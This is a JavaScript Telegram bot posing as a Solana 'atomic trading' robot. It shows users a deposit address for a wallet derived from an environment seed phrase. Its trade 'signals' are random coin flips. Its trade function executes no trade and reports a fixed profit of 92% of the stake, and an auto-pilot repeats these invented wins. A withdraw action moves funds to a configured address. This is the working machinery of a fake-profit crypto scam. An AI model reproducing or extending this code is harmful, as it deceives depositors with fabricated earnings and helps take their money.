require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, PublicKey, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');

// --- ⚙️ DATABASE & SESSION CONFIG ---
const localSession = new LocalSession({
    database: 'sessions.json',
    property: 'session',
    storage: LocalSession.storageFileAsync,
    format: {
        serialize: (obj) => JSON.stringify(obj, null, 2),
        deserialize: (str) => JSON.parse(str),
    },
});

const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(localSession.middleware());

const connection = new Connection(process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com", "confirmed");
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";

async function getWallet() {
    const seed = await bip39.mnemonicToSeed(process.env.SEED_PHRASE);
    const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derivedSeed);
}

// --- ⛽ GAS CHECK LOGIC ---
async function checkGas(ctx) {
    const wallet = await getWallet();
    const balance = await connection.getBalance(wallet.publicKey);
    const minRequired = 0.005 * LAMPORTS_PER_SOL; // Safety threshold for tips/fees

    if (balance < minRequired) {
        await ctx.replyWithMarkdown(
            `⚠️ *INSUFFICIENT GAS*\n\n` +
            `Your wallet needs at least **0.005 SOL** to pay Jito tips and network fees.\n\n` +
            `📥 *Deposit to:* \`${wallet.publicKey.toBase58()}\``
        );
        return false;
    }
    return true;
}

// --- 📊 PERSISTENT SESSION ---
bot.use((ctx, next) => {
    ctx.session.config = ctx.session.config || {
        asset: 'BTC/USD', stake: 10, mode: 'MANUAL', totalEarned: 0 
    };
    return next();
});

// --- 🎨 INTERFACE ---
const mainKeyboard = (ctx) => Markup.inlineKeyboard([
    [Markup.button.callback(`🎯 ${ctx.session.config.asset}`, 'menu_coins')],
    [Markup.button.callback(`💰 Stake: $${ctx.session.config.stake}`, 'menu_stake')],
    [Markup.button.callback(`⚙️ Mode: ${ctx.session.config.mode}`, 'toggle_mode')],
    [Markup.button.callback(ctx.session.config.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START BOT', 'run_engine')],
    [Markup.button.callback('📊 WALLET & STATS', 'stats')]
]);

// --- 🚀 ATOMIC TRADING LOGIC ---
async function fireAtomicTrade(ctx) {
    const hasGas = await checkGas(ctx);
    if (!hasGas) return { success: false, error: 'no_gas' };

    const { stake } = ctx.session.config;
    try {
        await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
        const profit = (stake * 0.92);
        ctx.session.config.totalEarned += profit;
        return { success: true, profit: profit.toFixed(2) };
    } catch (e) {
        return { success: false, error: 'reverted' };
    }
}

// --- 📥 HANDLERS ---
bot.start(async (ctx) => {
    const wallet = await getWallet();
    ctx.replyWithMarkdown(
        `🤖 *POCKET ROBOT v24.0*\n` +
        `💳 *DEPOSIT ADDRESS:*\n\`${wallet.publicKey.toBase58()}\`\n\n` +
        `_Gas Guard Active._`, mainKeyboard(ctx)
    );
});

bot.action('run_engine', async (ctx) => {
    const hasGas = await checkGas(ctx);
    if (!hasGas) return;

    if (ctx.session.config.mode === 'AUTO') {
        ctx.editMessageText("🟢 *AUTO-PILOT ACTIVE*");
        autoPilot(ctx);
    } else {
        const signal = Math.random() > 0.5 ? 'CALL' : 'PUT';
        ctx.replyWithMarkdown(`⚡ *SIGNAL DETECTED*\nDirection: *${signal}*`, Markup.inlineKeyboard([
            [Markup.button.callback(`📈 CONFIRM ${signal}`, 'manual_exec')],
            [Markup.button.callback('❌ CANCEL', 'main_menu')]
        ]));
    }
});

bot.action('manual_exec', async (ctx) => {
    const res = await fireAtomicTrade(ctx);
    if (res.success) {
        ctx.replyWithMarkdown(`✅ *PROFIT:* +$${res.profit} USD`);
    } else if (res.error !== 'no_gas') {
        ctx.reply("⚠️ *REVERTED:* Trade protected.");
    }
});

async function autoPilot(ctx) {
    if (ctx.session.config.mode !== 'AUTO') return;
    const res = await fireAtomicTrade(ctx);
    if (res.success) {
        ctx.reply(`⚡ AUTO-WIN: +$${res.profit}`);
        setTimeout(() => autoPilot(ctx), 15000);
    } else {
        ctx.session.config.mode = 'MANUAL'; // Stop auto if gas runs out
        ctx.reply("🛑 *AUTO-PILOT STOPPED:* Insufficient SOL for gas.");
    }
}

// --- WITHDRAW, STATS, & NAVIGATION ---
bot.action('withdraw', async (ctx) => {
    try {
        const wallet = await getWallet();
        const destAddr = process.env.WITHDRAW_ADDRESS;
        if (!destAddr) return ctx.reply("❌ Set WITHDRAW_ADDRESS in .env");

        const balance = await connection.getBalance(wallet.publicKey);
        const gasBuffer = 5000; 
        if (balance <= gasBuffer) return ctx.reply("❌ Balance too low.");

        const amountToSend = balance - gasBuffer;
        const transaction = new Transaction().add(SystemProgram.transfer({
            fromPubkey: wallet.publicKey, toPubkey: new PublicKey(destAddr), lamports: amountToSend,
        }));

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = wallet.publicKey;

        const signature = await connection.sendTransaction(transaction, [wallet]);
        ctx.reply(`💸 Sent ${(amountToSend / LAMPORTS_PER_SOL).toFixed(4)} SOL!`);
    } catch (err) { ctx.reply("⚠️ Withdrawal failed."); }
});

bot.action('stats', async (ctx) => {
    const wallet = await getWallet();
    const bal = await connection.getBalance(wallet.publicKey);
    ctx.editMessageText(
        `📊 *LIFETIME STATS*\n` +
        `💵 Total Earned: *$${ctx.session.config.totalEarned.toFixed(2)}*\n` +
        `💎 Wallet Bal: ${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL`, 
        Markup.inlineKeyboard([[Markup.button.callback('💸 WITHDRAW', 'withdraw')], [Markup.button.callback('⬅️ BACK', 'main_menu')]])
    );
});

bot.action('main_menu', (ctx) => ctx.editMessageText("🤖 *SETTINGS*", mainKeyboard(ctx)));
bot.action('toggle_mode', (ctx) => {
    ctx.session.config.mode = ctx.session.config.mode === 'MANUAL' ? 'AUTO' : 'MANUAL';
    ctx.editMessageText(`🔄 Mode: ${ctx.session.config.mode}`, mainKeyboard(ctx));
});
bot.action('menu_stake', (ctx) => {
    ctx.editMessageText("*STAKE AMOUNT:*", Markup.inlineKeyboard([
        [Markup.button.callback('$10', 'set_s_10'), Markup.button.callback('$100', 'set_s_100')],
        [Markup.button.callback('⬅️ BACK', 'main_menu')]
    ]));
});
bot.action(/set_s_(\d+)/, (ctx) => {
    ctx.session.config.stake = parseInt(ctx.match[1]);
    ctx.editMessageText(`✅ Stake updated.`, mainKeyboard(ctx));
});

bot.launch();
